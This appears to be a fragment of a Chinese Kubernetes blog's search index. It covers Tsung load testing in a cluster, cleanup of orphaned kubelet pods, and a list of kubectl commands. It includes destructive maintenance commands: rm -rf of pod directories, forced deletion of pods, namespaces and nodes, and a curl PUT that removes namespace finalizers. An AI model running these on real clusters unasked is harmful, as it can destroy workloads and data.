","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:1:0","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"About StatefulSet [StatefulSet] is a beta feature added to Kubernetes in 1.5. It is a controller used to provide unique identity to its Pods. Together with a headless service, we could assign dns name to each pods in the StatefulSet. ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:2:0","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Demo Here is a quick demo showing the process to launch a load test using Tsung in Kubernetes. You could modify tsung-config.yaml to test your own systems. ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:0","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Create Namespace kubectl create namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:1","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Launch test target We use nginx as a demo target target.yaml ---apiVersion:v1kind:Servicemetadata:labels:app:targetname:targetspec:ports:- port:80protocol:TCPtargetPort:80selector:app:targettype:ClusterIP---apiVersion:extensions/v1beta1kind:Deploymentmetadata:labels:app:targetname:nginxspec:replicas:1selector:matchLabels:app:targettemplate:metadata:labels:app:targetspec:containers:- name:nginx# image: nginximage:10.151.11.61:5000/com.inspur/nginx:1.17.7imagePullPolicy:IfNotPresentresources:limits:cpu:4# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \"true\"node-role.kubernetes.io/master:\"true\"# perf-test: \"true\" kubectl create -f target.yaml --namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:2","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Set Tsung config We will inject Tsung config to master pod using ConfigMap. Modify the settings if you like. 可根据实际测试场景，进行测试如下配置内容调整 tsung-config.yaml apiVersion:v1data:config.xml:|\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE tsung SYSTEM \"/usr/share/tsung/tsung-1.0.dtd\" []\u003e \u003ctsung loglevel=\"warning\"\u003e \u003cclients\u003e \u003cclient host=\"tsung-slave-0.tsung-slave.tsung.svc.cluster.local\" /\u003e \u003c/clients\u003e \u003cservers\u003e \u003cserver host=\"target\" port=\"8000\" type=\"tcp\"/\u003e \u003c/servers\u003e \u003cload\u003e \u003carrivalphase phase=\"1\" duration=\"1\" unit=\"minute\"\u003e \u003cusers arrivalrate=\"100\" unit=\"second\"/\u003e \u003c/arrivalphase\u003e \u003c/load\u003e \u003csessions\u003e \u003csession name=\"es_load\" weight=\"1\" type=\"ts_http\"\u003e \u003cfor from=\"1\" to=\"10\" incr=\"1\" var=\"counter\"\u003e \u003crequest\u003e \u003chttp url=\"/\" method=\"GET\" version=\"1.1\"\u003e\u003c/http\u003e \u003c/request\u003e \u003c/for\u003e \u003c/session\u003e \u003c/sessions\u003e \u003c/tsung\u003ekind:ConfigMapmetadata:name:tsung-config kubectl create -f tsung-config.yaml --namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:3","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Launch Tsung slave tsung-slave.yaml ---apiVersion:v1kind:Servicemetadata:labels:run:tsung-slavename:tsung-slavespec:clusterIP:Noneselector:run:tsung-slaveports:- port:22type:ClusterIP---apiVersion:apps/v1beta1kind:StatefulSetmetadata:name:tsung-slavespec:serviceName:\"tsung-slave\"replicas:2template:metadata:labels:run:tsung-slavespec:containers:- name:tsungimage:ddragosd/tsung-docker:1.6.0imagePullPolicy:IfNotPresentenv:- name:SLAVEvalue:\"true\"# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \"true\"# node-role.kubernetes.io/master: \"true\"perf-test:\"true\" kubectl create -f tsung-slave.yaml --namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:4","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Launch Tsung master Tsung master will begin the test as soon as the Pod boots up. When the test ended, the master process will keep running so that user could access the test report using Tsung web interface. ---apiVersion:v1kind:Servicemetadata:labels:run:tsung-mastername:tsung-masterspec:# clusterIP: None # modifyselector:run:tsung-masterports:- port:8091nodePort:38091# modifysessionAffinity:None# type: ClusterIPtype:NodePort# modify---apiVersion:apps/v1beta1kind:StatefulSetmetadata:name:tsung-masterspec:serviceName:\"tsung-master\"replicas:1template:metadata:labels:run:tsung-masterspec:containers:- name:tsungimage:ddragosd/tsung-docker:1.6.0imagePullPolicy:IfNotPresentenv:- name:ERL_SSH_PORTvalue:\"22\"args:- -k- -f- /tsung/config.xml- -F- startvolumeMounts:- mountPath:/tsungname:config-volumevolumes:- configMap:name:tsung-configname:config-volume# schedulerName: kube-batchnodeSelector:# node-role.kubernetes.io/node: \"true\"node-role.kubernetes.io/master:\"true\"# perf-test: \"true\" kubectl create -f tsung-master.yaml --namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:5","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Access Tsung web interface kubectl port-forward tsung-master-0 -n tsung 8091:8091 If set node-port:38091, Then we could access the web interface at http://master-node-ip:38091. Not need to set port-forward. ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:6","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Cleanup kubectl delete namespace tsung kubectl create namespace tsung kubectl create -f target.yaml --namespace tsung kubectl create -f tsung-config.yaml --namespace tsung kubectl create -f tsung-slave.yaml --namespace tsung kubectl create -f tsung-master.yaml --namespace tsung # kubectl port-forward tsung-master-0 -n tsung 8091:8091 注意 tsung-config.yaml 的需要跟 target.yaml 的svc配置的port相同 Then we could access the web interface at http://localhost:8091 or http://master-node-ip:38091 ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:7","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"Cleanup kubectl delete namespace tsung ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:3:8","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"参考 Tsung测试报告详解 Tsung Erlang StatefulSet ","date":"2021-03-08","objectID":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/:4:0","tags":["K8S"],"title":"业务压力测试tsung-in-k8s","uri":"/posts/2021/03/%E4%B8%9A%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95tsung-in-k8s/"},{"categories":["K8S"],"content":"记录kubelet残留孤儿pod(Orphaned pod)无法删除的问题分析和解决方法","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"记录kubelet残留孤儿pod(Orphaned pod)无法删除的问题分析和解决方法 ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:0:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"问题 查看kubelet日志，错误信息如下： E0823 10:31:01.847946 1303 kubelet_volumes.go:140] Orphaned pod \"19a4e3e6-a562-11e8-9a25-309c23027882\" found, but volume paths are still present on disk : There were a total of 2 errors similar to this. Turn up verbosity to see them. E0823 10:31:03.840552 1303 kubelet_volumes.go:140] Orphaned pod \"19a4e3e6-a562-11e8-9a25-309c23027882\" found, but volume paths are still present on disk : There were a total of 2 errors similar to this. Turn up verbosity to see them. 这些错误信息打印提示出现了Orphaned pod，并且每2秒打印1条记录，会导致系统日志充满kubelet的泛滥打印。影响对系统日志信息的查看。 ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:1:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"分析 原因为，k8s已经删除了该Orphaned pod信息（kubectl get 已经查询不到Orphaned pod），此时，kubelet从pod manager中获取all pods信息时不会有该孤儿pod，但是kubelet在cleanupOrphanedPodDirs操作清理该pod时，发现该pod的卷目录仍存在（或挂载使用中），pod卷目录仍存在且无法删除，就导致该pod在节点上无法删除，并提示Orphaned pod错误信息。 // cleanupOrphanedPodDirs removes the volumes of pods that should not be // running and that have no containers running. Note that we roll up logs here since it runs in the main loop. func (kl *Kubelet) cleanupOrphanedPodDirs(pods []*v1.Pod, runningPods []*kubecontainer.Pod) error { // If there are still volume directories, do not delete directory volumePaths, err := kl.getPodVolumePathListFromDisk(uid) if err != nil { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\"orphaned pod %q found, but error %v occurred during reading volume dir from disk\", uid, err)) continue } if len(volumePaths) \u003e 0 { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\"orphaned pod %q found, but volume paths are still present on disk\", uid)) continue } // If there are any volume-subpaths, do not cleanup directories volumeSubpathExists, err := kl.podVolumeSubpathsDirExists(uid) if err != nil { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\"orphaned pod %q found, but error %v occurred during reading of volume-subpaths dir from disk\", uid, err)) continue } if volumeSubpathExists { orphanVolumeErrors = append(orphanVolumeErrors, fmt.Errorf(\"orphaned pod %q found, but volume subpaths are still present on disk\", uid)) continue } } ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:2:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"解决 一般的 我们会直接删除掉这个孤儿pod的目录，该操作需谨慎。 # kubeectl 查询不到该$podid的pod信息，则可以进行清理操作 # 删除该Orphaned pod数据目录 KUBELET_HOME=/var/lib rm -rf ${KUBELET_HOME}/kubelet/pods/$podid ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:3:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"Orphaned pod批量清理 如果系统环境中存在大量的Orphaned pod需求清理，可使用下面脚本批量处理 #!/bin/bash # 这个脚本使用优雅方式进行pod相关挂载卷的卸载处理和卷目录删除，并不手动删除pod目录（其内可能包含pod数据） KUBELET_HOME=/var/lib # 通过系统日志获取到全部孤儿pod的podid # for podid in $(grep \"orphaned pod\" /var/log/syslog | tail -1 | awk '{print $12}' | sed 's/\"//g'); for podid in $(grep \"orphaned pod\" /var/log/messages | tail -1 | awk '{print $12}' | sed 's/\"//g'); do if [ ! -d ${KUBELET_HOME}/kubelet/pods/$podid ]; then break fi if [ -d ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths/ ]; then mountpath=$(mount | grep ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths/ | awk '{print $3}') for mntPath in $mountpath; do umount $mntPath done rm -rf ${KUBELET_HOME}/kubelet/pods/$podid/volume-subpaths fi csiMounts=$(mount | grep \"${KUBELET_HOME}/kubelet/pods/$podid/volumes/kubernetes.io~csi\") if [ \"$csiMounts\" != \"\" ]; then echo \"csi is mounted at: $csiMounts\" exit 1 else rm -rf ${KUBELET_HOME}/kubelet/pods/$podid/volumes/kubernetes.io~csi fi volumeTypes=$(ls ${KUBELET_HOME}/kubelet/pods/$podid/volumes/) for volumeType in $volumeTypes; do subVolumes=$(ls -A ${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeType) if [ \"$subVolumes\" != \"\" ]; then echo \"${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeTypecontents volume: $subVolumes\" exit 1 else rmdir ${KUBELET_HOME}/kubelet/pods/$podid/volumes/$volumeType fi done done ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:4:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"参考 OrphanedPod Issue OrphanedPod Found ","date":"2021-03-02","objectID":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/:5:0","tags":["K8S"],"title":"kubelet残留孤儿pod(Orphaned pod)无法删除的问题","uri":"/posts/2021/03/kubelet%E6%AE%8B%E7%95%99%E5%AD%A4%E5%84%BFpodorphaned-pod%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"K8S常用操作命令集合","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"K8S常用操作命令集合，持续更新~~~ ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:0:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"pod 操作 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"批量删除terminating pods # batch delete terminating pods NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep Terminating |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:1","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"[慎用] 删除NAMESPACE下的所有资源 # kubectl delete ns $NAMESPACE NAMESPACE=kubemark kubectl delete ns $NAMESPACE --force --grace-period=0 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:2","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"批量删除 NAMESPACE下的 Init:0/1 状态 pod NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep \"Init:0/1\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:3","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"批量删除 NAMESPACE下的 ContainerCreating 状态 pod NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep \"ContainerCreating\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:4","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"批量删除集群NAMESPACE下的 ContainerCreating 或 Init:0/1 状态 pod NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 示例：清理kubemark资源 # delete hollow-node-sts # kubectl delete -f hollow-node-sts.yaml NAMESPACE=kubemark kubectl get po -n $NAMESPACE |grep -E \"Terminating|CrashLoopBackOff|Error\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=kube-system kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 NAMESPACE=aistation kubectl get po -n $NAMESPACE |grep -E \"ContainerCreating|Init:0/1\" |awk '{print $1}' |xargs kubectl delete pod -n $NAMESPACE --force --grace-period=0 #NAMESPACE=kubemark #kubectl delete ns $NAMESPACE --force --grace-period=0 # clear nodes kubectl get no |grep \"hollow-node\" |awk '{print $1}' |xargs kubectl delete no --force --grace-period=0 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:1:5","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"node 操作 ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:2:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"批量删除指定node TAGCLASS=\"hollow-node-\" kubectl get no |grep $TAGCLASS |awk '{print $1}' |xargs kubectl delete no ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:2:1","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"指定node 打标签 # 添加node标签 # kubectl label nodes kube-node-name label_name=label_value kubectl label nodes node61 perf-test=true # 删除node标签 # kubectl label nodes kube-node-name label_name- kubectl label nodes node61 perf-test- # 更新node标签 # kubectl label nodes kube-node-name label_name=label_value --overwrite kubectl label nodes node61 perf-test=true --overwrite kubectl label nodes node53 perf-test=true --overwrite # 显示ndoe标签 kubectl get no --show-labels ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:2:2","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"namespace操作 kubectl get namespace tsung -o json |jq '.spec = {\"finalizers\":[]}' \u003etemp.json# 如果没有jq，则输出完整json，并修改kubectl get namespace tsung -o json \u003etemp.json# 修改temp.json中的 spec和 status 字段内容curl -k -H \"Content-Type: application/json\" -X PUT --data-binary @temp.json 10.151.11.61:8080/api/v1/namespaces/tsung/finalize ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:3:0","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"强制删除namespace 状态为termiating， 名称为test- 的资源 kubectl get ns |grep test- |awk '{print $1}' |xargs kubectl delete ns --force --grace-period=0 # 指定ns_test # ns_test=test-c6gg2n-1 # 或 查找系统中存在的1条ns_test ns_test=$(kubectl get ns |grep test- |awk '{print $1}') kubectl get namespace ${ns_test} -o json \u003etemp.json # vim temp.json # to delete spec and status fields sed -i '12,19d' temp.json sed -i 's/},/}/g' temp.json # k8s-apiserve url api_url=192.168.2.101:8080 curl -k -H \"Content-Type: application/json\" -X PUT --data-binary @temp.json ${api_url}:8080/api/v1/namespaces/${ns_test}/finalize ","date":"2021-02-28","objectID":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/:3:1","tags":["K8S"],"title":"K8S常用操作命令集合","uri":"/posts/2021/02/k8s%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/"},{"categories":["K8S"],"content":"实例 [root@node61 perf-test]# kubectl get ns NAME STATUS AGE 0eaea880-7d1c-4d07-8fa5-dc71eb10aa8a Active 5d22h aistation Active 6d default Active 6d13h kube-node-lease Active 6d13h kube-public Active 6d13h kube-system Active 6d13h kubeflow Active 6d kubemark Active 5d23h monitoring Active 4d23h test-pyb3an-1 Terminating 15m [root@node61 perf-test]# cat temp.json { \"apiVersion\": \"v1\", \"kind\": \"Namespace\", \"metadata\": { \"creationTimestamp\": \"2021-03-04T08:06:07Z\", \"deletionTimestamp\": \"2021-03-05T07:20:42Z\", \"name\": \"tsung\", \"resourceVersion\": \"2875375\", \"selfLink\": \"/api/v1/namespaces/tsung\", \"uid\": \"790d2ec0-7cc0-11eb-a786-6c92bf8b7fa6\" }, \"spec\": { \"finalizers\": [ \"kubernetes\" ] }, \"status\": { \"phase\": \"Terminating\" } } [root@node61 perf-test]# vi temp.json [root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# curl -k -H \"Content-Type: application/json\" -X PUT --data-binary @temp.json 10.151.11.61:8080/api/v1/namespaces/tsung/finalize { \"kind\": \"Namespace\", \"apiVersion\": \"v1\", \"metadata\": { \"name\": \"tsung\", \"selfLink\": \"/api/v1/namespaces/tsung/finalize\", \"uid\": \"790d2ec0-7cc0-11eb-a786-6c92bf8b7fa6\", \"resourceVersion\": \"6375674\", \"creationTimestamp\": \"2021-03-04T08:06:07Z\", \"deletionTimestamp\": \"2021-03-05T07:20:42Z\" }, \"spec\": { }, \"status\": { \"phase\": \"Terminating\" } }[root@node61 perf-test]# [root@node61 perf-test]# [root@node61 perf-test]# kubectl get ns NAME STATUS AGE 0eaea880-7d1c-4d07-8fa5-dc71eb10aa8a Active 5d22h aistation Active 6d default Active 6d13h kube-node-lease Active 6d13h kube-public Active 6d13h kube-system Active 6d13h kubeflow Active 6d kubemark Active 5d23h monitoring Active 4d23h 